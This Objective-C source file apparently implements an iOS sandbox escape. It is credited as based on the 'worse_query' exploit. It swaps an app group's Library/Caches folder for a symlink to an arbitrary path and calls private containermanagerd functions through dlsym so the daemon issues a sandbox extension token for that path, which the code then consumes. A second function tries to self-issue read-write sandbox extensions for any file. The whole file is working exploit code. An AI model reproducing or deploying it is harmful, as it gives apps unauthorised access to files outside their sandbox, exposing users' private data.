//
//  worse_query.m
//  IOSurfaceSafeProbe
//
//  Based on worse_query by Taj C (forcequit) - GPL-3.0
//

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);
typedef char *(*sandbox_extension_issue_file_fn)(const char *, const char *, uint32_t);

static void clean_symlink(NSString *group) {
    if (!group) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) return;
    NSURL *caches = [groupRoot URLByAppendingPathComponent:@"Library/Caches"];
    [fm removeItemAtURL:caches error:nil];
    [fm createDirectoryAtURL:caches withIntermediateDirectories:NO attributes:nil error:nil];
}

int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) return -1;
    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    container_query_create_fn query_create = dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers ||
        !query_set_flags || !query_set_part || !query_get_single_result ||
        !query_free || !copy_sandbox_token || !consume) {
        dlclose(mgr);
        return -2;
    }

    uint64_t flags = alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL;

    // Replace Library/Caches with symlink to target
    [fm removeItemAtPath:caches error:nil];
    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
        clean_symlink(group);
        dlclose(mgr);
        return -4;
    }

    // Query containermanagerd - it follows the symlink and issues a sandbox token
    void *query = query_create();
    if (!query) { clean_symlink(group); dlclose(mgr); return -3; }

    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    query_set_class(query, 7);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);
    query_set_flags(query, flags);

    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        clean_symlink(group);
        dlclose(mgr);
        return -5;
    }

    char *token = copy_sandbox_token(result);
    query_free(query);
    clean_symlink(group);
    dlclose(mgr);

    if (!token) return -6;

    int64_t handle = consume(token);
    free(token);
    return handle > 0 ? handle : -7;
}

int64_t worse_query_issue_self(NSString *target) {
    sandbox_extension_issue_file_fn issue = dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file_to_self");
    sandbox_extension_consume_fn consume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!issue || !consume) return -2;

    const char *classes[] = {
        "com.apple.app-sandbox.read-write",
        "com.apple.app-sandbox.read",
        "com.apple.sandbox.container",
    };

    for (int i = 0; i < 3; i++) {
        char *token = issue(classes[i], target.fileSystemRepresentation, 0);
        if (token) {
            int64_t h = consume(token);
            free(token);
            if (h > 0) return h;
        }
    }
    return -8;
}

void worse_query_release(int64_t handle) {
    if (handle <= 0) return;
    sandbox_extension_release_fn rel = dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (rel) rel(handle);
}
